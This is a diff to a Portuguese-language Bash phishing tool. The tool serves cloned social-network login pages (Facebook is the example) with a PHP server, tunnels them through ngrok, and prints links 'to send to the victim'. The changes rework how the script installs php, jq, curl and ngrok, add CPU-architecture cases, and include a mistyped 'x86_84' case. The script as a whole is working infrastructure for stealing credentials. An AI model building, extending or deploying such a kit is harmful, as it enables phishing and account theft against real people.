@@ -55,7 +55,9 @@ serviceKey=0
 listenKey=0
 tunnelKey=0
 
-verifyProot() {
+listReq=("php" "jq" "curl" "tar")
+
+verifySystemOs() {
     proot=$(ps -e | grep -Eo "proot")
 
     if [ -z "$proot" ] ; then
@@ -84,9 +86,6 @@ interruptTwo() {
 }
 
 listen() {
-    clear
-    installReqIfNotExists
-
     if  [ -n "$tunnel" -a "$tunnel" == "ngrok" ] ; then
 	functionGroup
 
@@ -97,10 +96,11 @@ listen() {
 }
 
 functionGroup() {
-    verifyProot
+    verifySystemOs
     removeFiles
     copyFiles
     processKill
+    installReqIfNotExists
     listenLocalhost
     banner
     echo -e "\e[32m[+] Dados para enviar a vítima:\e[0m"
@@ -108,7 +108,6 @@ functionGroup() {
 }
 
 listenLocalhost() {
-    #installReqIfNotExists
     php -S ${host}:${port} -t ./www > /dev/null 2>&1 &
     sleep 3
 }
@@ -130,10 +129,8 @@ copyFiles() {
 }
 
 tunnel() {
-    installReqIfNotExists
-
     if [ "$tunnel" == "ngrok" ] ; then
-        verifyProot
+        verifySystemOs
         ngrok http $port --log=stdout > /dev/null 2>&1 &
         sleep 3
         showLinkNgrok
@@ -213,6 +210,7 @@ get_data() {
 }
 
 banner() {
+clear
 echo -e "\e[34m
 	        '  
               '   '  TIOOLIVER | t.me/tiooliver_sh
@@ -232,13 +230,13 @@ echo -e "\e[34m
 
 helper() {
     echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tMostra esta tela de ajuda e sai\n\t-v, --version\tMostra versão atual do programa\n\t-L, --list\tLista todos os serviços sociais disponíveis\n\t-s, --service\tSeleciona um serviço social\n\t-l, --listen\tAtiva esculta no localhost\ni\t-t, --tunnel\tTunela a conexão localhost\nEXEMPLOS:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
-    exit 1
+    exit 0
 }
 
 version() {
     echo -ne "$(basename "$0")"
     grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr A-Z a-z
-    exit 1
+    exit 0
 }
 
 list() {
@@ -251,62 +249,70 @@ list() {
 }
 
 installReqIfNotExists() {
-    #arch=$(getprop ro.bionic.arch)
-
-    case "$(dpkg --print-architecture)" in
-	armhf|arm) arch="arm";;
-	
-	*)
-	    echo "[!] Invalid architecture"
-	    exit 1
-    esac
-
     [ -d /usr/bin ] && dir=/usr/bin
     [ -d $PREFIX/bin ] && dir=$PREFIX/bin
 
+    installForApt # Instala requisitos 
+
+    case "$(dpkg --print-architecture)" in
+	aarch64)
+	    arch="arm64";;
+        armhf|arm)
+	    arch="arm";;
+	amd64)
+	    arch="amd64";;
+	x86_84)
+	    arch="amd64";;
+	i*86)
+	    arch="i386";;
+	i386)
+	    arch="i386";;
+    *)
+	echo "[!] Invalid architecture"
+	exit 1
+    esac
+
+    link="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz"
+
     if [ ! -f ${dir}/ngrok ] ; then
 	printf "\r\e[33;1m[*] Instalando Ngrok...\e[0m"
-
-	curl -LO https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz > /dev/null 2>&1 &
+	curl -LO $link > /dev/null 2>&1 &
 
 	while [ -n "$(ps -e | grep -Eo 'curl')" ] ; do
 	    printf "\r\e[33;1m[*] Instalando Ngrok..."
-	done
+	
+    	done
 	printf "\r\e[33;1m[+] Instalando Ngrok...\e[32;1mOK\e[0m\n"
 	while [ ! -f ${dir}/ngrok ] ; do
 	    printf "\r\e[33;1m[*] Extraindo Ngrok...\e[0m"
 	    tar -xvzf ngrok-v3-stable-linux-${arch}.tgz -C $dir > /dev/null
-        done
+	done
 	printf "\r\e[33;1m[+] Extraindo Ngrok...\e[32;1mOK\e[0m\n"
 	rm ngrok-v3-stable-linux-${arch}.tgz
     fi
+}
 
-    if [ ! -f ${dir}/jq ] ; then
-	if [ -d $PREFIX/bin ] ; then
-	    while [ ! -f ${dir}/jq ] ; do
-	        printf "\r\e[33;1m[*] Instalando Jq...\e[0m"
-   	        apt install jq -y > /dev/null 2>&1
- 	    done
-	    printf "\r\e[33;1m[+] Instalando Jq...\e[32;1mOK\e[0m\n"
-
-	elif [ -d /usr/bin ] ; then
-	    echo -e "\e[33;1m[+] Instalando Jq...\e[32;1mOK\e[0m\n"
-	    apt-get update && apt-get install jq -yq
+installForApt() {
+    for package in ${listReq[*]} ; do
+        if [ ! -f ${dir}/${package} ] ; then
+	    if [ -d "$PREFIX" ] ; then
+	        while [ ! -f ${dir}/${package} ] ; do
+	            printf "\r\e[33;1m[*] Instalando $package...\e[0m"
+		    apt update > /dev/null 2>&1
+		    apt install $package -y > /dev/null 2>&1
+ 	        done
+	        printf "\r\e[33;1m[+] Instalando $package...\e[32;1mOK\e[0m\n"
+            else
+	        while [ ! -f $dir/$package ] ; do
+		    echo -e "\e[33;1m[*] Instalando $package...\e[0m"
+		    apt-get update
+		    apt-get upgrade -y
+		    apt-get install $package -y
+		done
+		echo -e "\e[33;1m[+] Instalando $package...\e[32;1mOK\e[0m"
+	    fi
 	fi
-    fi
-
-    if [ ! -f ${dir}/php ] ; then
-	if [ -d $dir ] ; then
-	    while [ ! -f ${dir}/php* ] ; do
-	        printf "\r\e[33;1m[*] Instalando Php...\e[0m"
-	        apt install php -y > /dev/null 2>&1
-	    done
-	    printf "\r\e[33;1m[+] Instalando Php...\e[32;1mOK\e[0m\n"
-	elif [ -d /usr/bin ] ; then
-	    echo -e "\e[33;1m[*] Instalando Php...\e[0m"
-	    apt-get update && apt-get install php -yq
-	fi
-    fi
+    done
 }
 
 
